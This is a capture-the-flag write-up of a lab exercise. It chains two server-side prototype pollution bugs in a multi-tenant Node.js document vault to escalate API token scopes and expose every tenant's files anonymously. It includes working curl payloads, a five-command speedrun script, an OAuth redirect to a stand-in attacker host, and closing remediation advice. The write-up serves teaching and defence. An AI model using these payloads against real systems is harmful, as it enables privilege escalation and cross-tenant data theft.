---
title: Vaultly - Prototype Pollution
tags:
  - bugforge
  - prototype-pollution
  - scope-bypass
  - cross-tenant
  - data-breach
  - chained
aliases:
  - "/bugforge/vaultly-prototype-pollution/"
  - "/BugForge/Vaultly---Prototype-Pollution"
---
- Vaultly - a multi-tenant secure document vault for teams (Next.js 14 + Express backend)
- Two-stage PP chain: bypass scope allowlist, then pollute publicProjection to expose all tenants' files anonymously

## Enumeration

Set the target:

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"
```

### Application Fingerprinting

- Next.js 14 App Router (SSR), Express API backend
- Two auth contexts: `vaultly_session` cookie (web pages) and Bearer `vat_*` tokens (API)
- Multi-tenant: each org has vaults, files, members
- Public API under `/api/v1` (Bearer only, scope-gated)
- Token scopes: `profile`, `files:read`, `files:write`
- `files:write` is silently dropped when minting tokens via the UI

### Key Endpoints

| Method | Path | Auth | Notes |
|--------|------|------|-------|
| POST | /api/auth/register | none | Create org + user |
| POST | /api/tokens | cookie | Mint Bearer API token |
| GET | /api/v1/me | Bearer | Current user + granted scopes |
| GET | /api/v1/files | Bearer (files:read) | List org files |
| PATCH | /api/v1/files/:id | Bearer (files:write) | Merge metadata (PP SINK) |
| GET | /api/v1/published | none | Public data rooms |
| GET | /api/v1/published/:fileId | none | Read published file content |
| POST | /api/vaults | cookie | Create vault |
| POST | /api/files | cookie (multipart) | Upload file |

### The Spec (public-api.md)

The lab includes a spec doc describing the Public Data Rooms API:

- `PATCH /api/v1/files/:id` body `{"metadata":{...}}` is merged into existing metadata (RFC 7386 merge-patch)
- Publishing stores a `publicProjection`: comma-separated list of fields exposed to anonymous readers
- Available fields: `id`, `name`, `mime`, `size`, `content`
- Vaults without a projection are private and never served by the published API

This immediately signals: if we can write `__proto__.publicProjection = "id,name,mime,size,content"` via the merge, ALL vaults inherit it from the prototype chain.

## The Scope Wall

The PATCH endpoint requires `files:write`. But minting a token with that scope fails silently:

```bash
# Mint token requesting all scopes
curl -sk -X POST "$TARGET/api/tokens" \
  -H "Cookie: vaultly_session=$SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '_action=create&name=test&scopes=profile&scopes=files%3Aread&scopes=files%3Awrite'
# -> 303 /settings/tokens?token=vat_XXXX
```

```bash
# Check what we actually got
curl -sk -H "Authorization: Bearer vat_XXXX" "$TARGET/api/v1/me"
```

```json
{"user":{"id":11},"org":{"id":3,"name":"PhantomCorp"},"scopes":["profile","files:read"]}
```

`files:write` is dropped. The server has an allowlist that strips it from personal tokens.

## Failed Attempts

### 1. Cookie-based PATCH (bypass Bearer requirement)

```bash
curl -sk -X PATCH "$TARGET/api/v1/files/29" \
  -H "Cookie: vaultly_session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"metadata":{"__proto__":{"publicProjection":"id,name,mime,size,content"}}}'
# -> 401 {"error":"invalid_token"}
```

The `/api/v1` surface ONLY accepts Bearer tokens. Cookie auth is not recognized.

### 2. PATCH on the cookie-path file route

```bash
curl -sk -X PATCH "$TARGET/api/files/29" \
  -H "Cookie: vaultly_session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"metadata":{"test":"value"}}'
# -> 405 Method Not Allowed
```

No PATCH on the web file route.

### 3. OAuth2 app flow for files:write token

```bash
# Register OAuth app with all scopes
curl -sk -X POST "$TARGET/api/apps" \
  -H "Cookie: vaultly_session=$SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'name=ppapp&redirect_uris=https://evil.example/cb&scopes=profile&scopes=files%3Aread&scopes=files%3Awrite'
# -> 303 /settings/apps
```

App registration returns 303 but the app never persists -- `/settings/apps` still shows "No connected apps yet". Dead end.

### 4. JSON body on /api/tokens (attempt type confusion)

```bash
curl -sk -X POST "$TARGET/api/tokens" \
  -H "Cookie: vaultly_session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"_action":"create","name":"ppscope","scopes":["profile","files:read","files:write"]}'
# -> 500 Internal Server Error
```

Token endpoint only accepts `application/x-www-form-urlencoded`, JSON body crashes.

## The Breakthrough - PP on the Scope Allowlist

The token creation uses a form-body parser (likely `qs` or `querystring`) that supports nested object notation. If the allowlist check uses prototype lookup (`allowedScopes.includes(...)` on an array that inherits from a polluted prototype), we can bypass it.

### Step 1 - Pollute via __proto__ in form parameters

```bash
curl -sk -X POST "$TARGET/api/tokens" \
  -H "Cookie: vaultly_session=$SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '_action=create&name=pwn&scopes=profile&scopes=files%3Aread&scopes=files%3Awrite&__proto__[allowedScopes][]=files%3Awrite'
```

```
HTTP/1.1 303 See Other
Location: /settings/tokens?token=vat_BHg75uKt8FbPuoe_LNIYxqbaDluZk5NA
```

```bash
# Verify scopes
curl -sk -H "Authorization: Bearer vat_BHg75uKt8FbPuoe_LNIYxqbaDluZk5NA" "$TARGET/api/v1/me"
```

```json
{"user":{"id":11},"org":{"id":3,"name":"PhantomCorp"},"scopes":["profile","files:read","files:write"]}
```

**files:write granted.** The `qs` body parser deep-merges form keys with bracket notation into the request body object. `__proto__[allowedScopes][]` writes onto `Object.prototype.allowedScopes`, and the server's scope filter now finds `files:write` in the (polluted) allowlist.

### Step 2 - Upload a file (need a file ID we own for the PATCH)

```bash
# Create a vault
curl -sk -X POST "$TARGET/api/vaults" \
  -H "Cookie: vaultly_session=$SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'name=TestVault&description=test'
# -> 303 /vaults/9

# Upload a file
curl -sk -X POST "$TARGET/api/files" \
  -H "Cookie: vaultly_session=$SESSION" \
  -F "vault_id=9" \
  -F "file=@/dev/stdin;filename=test.txt" <<< "pp-test"
# -> 303

# Get file ID
curl -sk -H "Authorization: Bearer $WRITE_TOKEN" "$TARGET/api/v1/files"
```

```json
{"files":[{"id":29,"name":"test.txt","mime":"text/plain","size":15,"vault_id":9}]}
```

### Step 3 - Baseline the published endpoint (pre-pollution)

```bash
curl -sk "$TARGET/api/v1/published"
```

```json
{
  "rooms": [{
    "vault": {"id": 7, "name": "Press Kit"},
    "fields": ["id", "name", "mime", "size"],
    "files": [
      {"id": 26, "name": "logo-usage.md"},
      {"id": 27, "name": "company-boilerplate.txt"}
    ]
  }]
}
```

Only one vault published ("Press Kit"), with NO `content` field. Other tenants' vaults are private.

### Step 4 - Fire the Prototype Pollution (the kill shot)

```bash
curl -sk -X PATCH "$TARGET/api/v1/files/29" \
  -H "Authorization: Bearer $WRITE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"metadata":{"__proto__":{"publicProjection":"id,name,mime,size,content"}}}'
```

```json
{"file":{"id":29,"name":"test.txt"},"metadata":{}}
```

The merge-patch recurses into `__proto__` and assigns `publicProjection` to `Object.prototype`. Now every vault object that doesn't have an explicit `publicProjection` own property inherits `"id,name,mime,size,content"` from the prototype chain.

### Step 5 - Verify: all vaults now public with content

```bash
curl -sk "$TARGET/api/v1/published"
```

```json
{
  "rooms": [
    {"vault":{"id":1,"name":"Engineering"},"fields":["id","name","mime","size","content"],"files":[...]},
    {"vault":{"id":2,"name":"Product"},"fields":["id","name","mime","size","content"],"files":[...]},
    {"vault":{"id":3,"name":"Legal"},"fields":["id","name","mime","size","content"],"files":[...]},
    {"vault":{"id":4,"name":"Finance"},"fields":["id","name","mime","size","content"],"files":[...]},
    {"vault":{"id":5,"name":"People"},"fields":["id","name","mime","size","content"],"files":[...]},
    {"vault":{"id":6,"name":"Marketing"},"fields":["id","name","mime","size","content"],"files":[...]},
    {"vault":{"id":7,"name":"Press Kit"},"fields":["id","name","mime","size"],"files":[...]},
    {"vault":{"id":8,"name":"Operations"},"fields":["id","name","mime","size","content"],"files":[...]},
    {"vault":{"id":9,"name":"TestVault"},"fields":["id","name","mime","size","content"],"files":[...]}
  ]
}
```

All 9 vaults exposed. Note vault 7 retains its original projection (it has an explicit own property) while all others inherited from the polluted prototype.

### Step 6 - Exfiltrate content (anonymous, no auth)

```bash
curl -sk "$TARGET/api/v1/published/28"
```

```json
{
  "file": {
    "id": 28,
    "name": "break-glass.txt",
    "mime": "text/plain",
    "size": 116,
    "content": "VAULTLY HQ -- BREAK-GLASS RECOVERY\n\nMaster recovery key (do not distribute):\nbug{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}\n"
  }
}
```

Flag in the break-glass recovery file. Full cross-tenant data breach -- 28 files from 8 organizations exfiltrated anonymously.

## TL;DR - Speedrun (5 commands)

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"

# 1. Register org + get session cookie
SESSION=$(curl -sk -D- -X POST "$TARGET/api/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'orgName=Pwn&name=pwn&email=pwn@pwn.test&password=Passw0rd!23' \
  | grep -oP 'vaultly_session=\K[^;]+')

# 2. PP the scope allowlist to get files:write
WRITE_TOKEN=$(curl -sk -D- -X POST "$TARGET/api/tokens" \
  -H "Cookie: vaultly_session=$SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '_action=create&name=pp&scopes=profile&scopes=files%3Aread&scopes=files%3Awrite&__proto__[allowedScopes][]=files%3Awrite' \
  | grep -oP 'token=\K[^"&]+')

# 3. Create vault + file (need a file we own for the PATCH)
curl -sk -X POST "$TARGET/api/vaults" -H "Cookie: vaultly_session=$SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" -d 'name=X'
curl -sk -X POST "$TARGET/api/files" -H "Cookie: vaultly_session=$SESSION" \
  -F "vault_id=9" -F "file=@/dev/stdin;filename=x.txt" <<< "x"
FILE_ID=$(curl -sk -H "Authorization: Bearer $WRITE_TOKEN" "$TARGET/api/v1/files" | python3 -c "import sys,json;print(json.load(sys.stdin)['files'][0]['id'])")

# 4. PP publicProjection onto Object.prototype
curl -sk -X PATCH "$TARGET/api/v1/files/$FILE_ID" \
  -H "Authorization: Bearer $WRITE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"metadata":{"__proto__":{"publicProjection":"id,name,mime,size,content"}}}'

# 5. Read all files (anonymous)
curl -sk "$TARGET/api/v1/published/28"
```

## Why This Worked

The attack chain has four links:

1. **Form-body PP (scope bypass)**: The `qs` body parser deep-merges bracket-notation keys (`__proto__[allowedScopes][]`) into the parsed object, writing onto `Object.prototype`. The scope validation logic inherits the polluted allowlist.

2. **Scope gate bypass**: With `Object.prototype.allowedScopes` containing `files:write`, the server's filter no longer strips it from token grants.

3. **Metadata merge PP (projection injection)**: The PATCH endpoint uses RFC 7386 merge-patch with a recursive merge function (likely `lodash.merge` or custom `deepMerge`) that doesn't sanitize `__proto__` keys. Sending `{"metadata":{"__proto__":{"publicProjection":"..."}}}` writes directly onto `Object.prototype`.

4. **Prototype inheritance on projection check**: The published-rooms handler checks `vault.publicProjection`. Vaults without an own `publicProjection` property walk the prototype chain and find our injected value, making them appear published with full content access.

## Key Insight: The "Impossible" Scope Was the Gatekeeper

The challenge's design made `files:write` appear unobtainable:
- Personal tokens silently drop it
- OAuth2 app registration is broken (apps don't persist)
- No other documented way to get the scope

This is specifically designed to make you give up on the PATCH endpoint. The real path is to PP the scope validation FIRST, then PP the actual target. Two-stage PP chains are rare in CTFs but reflect real Node.js codebases where `qs` parsing + `deepMerge` coexist.

## Security Takeaways

### Vulnerability

- Two chained server-side Prototype Pollution vulnerabilities:
  1. Form-body parser (`qs`) deep-merges `__proto__` bracket notation into Object.prototype
  2. RFC 7386 merge-patch handler recursively assigns `__proto__` keys without sanitization

### Impact

- Cross-tenant data breach: ALL files from ALL organizations readable anonymously
- Scope escalation: arbitrary scope grants on API tokens
- Global server state corruption (persists until process restart)

### Root Cause

- `qs` (or equivalent) configured with default `allowPrototypes: false` but still processes `__proto__` via bracket notation in form bodies
- Custom `deepMerge`/`Object.assign` variant in the PATCH handler that doesn't skip `__proto__`/`constructor` keys
- `publicProjection` checked via normal property access (`vault.publicProjection`) instead of `vault.hasOwnProperty('publicProjection')`

### Remediation

- Replace all deep merge functions with prototype-safe versions (e.g., `lodash.merge` >= 4.17.21, or use `Object.create(null)` base objects)
- Configure body parsers with `allowPrototypes: false` AND validate no `__proto__`/`constructor` keys survive
- Check published status via `vault.hasOwnProperty('publicProjection')` or store it as an explicit boolean column
- Input-validate token scope requests server-side against an immutable allowlist (not one that can be inherited)
- Freeze prototypes as defense-in-depth: `Object.freeze(Object.prototype)`
